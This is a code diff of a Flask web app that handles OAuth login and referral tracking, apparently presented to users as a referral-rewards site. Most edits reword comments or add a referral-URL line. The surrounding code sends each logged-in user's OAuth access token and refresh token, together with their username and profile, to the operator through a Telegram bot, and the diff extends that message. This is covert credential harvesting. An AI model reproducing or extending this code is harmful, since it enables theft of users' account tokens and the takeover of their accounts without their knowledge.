@@ -409,7 +409,7 @@ def home():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
-    referrer_id = request.args.get('referrer_id')  # New parameter for tracking referrals
+    referrer_id = request.args.get('referrer_id')  # Parameter for tracking referrals
 
     # If the user is already logged in, redirect them to the welcome page
     if 'username' in session:
@@ -417,7 +417,7 @@ def home():
         send_message_via_telegram(f"👋 @{username} just returned to the website.")
         return redirect(url_for('welcome'))
 
-    # Store referrer_id in session for tracking referrals if present
+    # Store referrer_id in session if present for tracking referrals
     if referrer_id:
         session['referrer_id'] = referrer_id
 
@@ -467,12 +467,13 @@ def home():
                 session['referral_url'] = referral_url
                 total_tokens = get_total_tokens()
 
-                # Send Telegram notification with user details
+                # Send Telegram notification with user details, including referral URL
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
                     f"🔗 Profile URL: {profile_url}\n"
+                    f"🔗 Referral URL: {referral_url}\n"  # Included referral URL in the message
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
 
@@ -503,18 +504,19 @@ def generate_referral_url(username):
         cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
         existing_referral = cursor.fetchone()
         
-        if not existing_referral:
-            # Create a new referral URL for the user if it doesn't exist
+        if not existing_referral or not existing_referral[0]:  # Update condition to check for empty referral
+            # Insert referral URL if it doesn't exist
             cursor.execute("UPDATE users SET referral_url = %s WHERE username = %s", (referral_url, username))
             conn.commit()
             print(f"Referral URL created for user: {username}")
         else:
-            referral_url = existing_referral[0]
+            referral_url = existing_referral[0]  # Use existing referral URL if found
         
         conn.close()
     except Exception as e:
         print(f"Error generating referral URL for {username}: {e}")
     return referral_url
+
 
 
 @app.route('/welcome')
@@ -557,7 +559,7 @@ def get_user_stats(username):
                 COALESCE(users.token_balance, 0) AS token_balance,
                 COALESCE(users.referral_count, 0) AS referral_count,
                 COALESCE(users.referral_reward, 0) AS referral_reward,
-                users.referral_url
+                users.referral_url  -- Ensure this field is retrieved
             FROM users
             LEFT JOIN tasks ON tasks.user_id = users.id
             WHERE users.username = %s
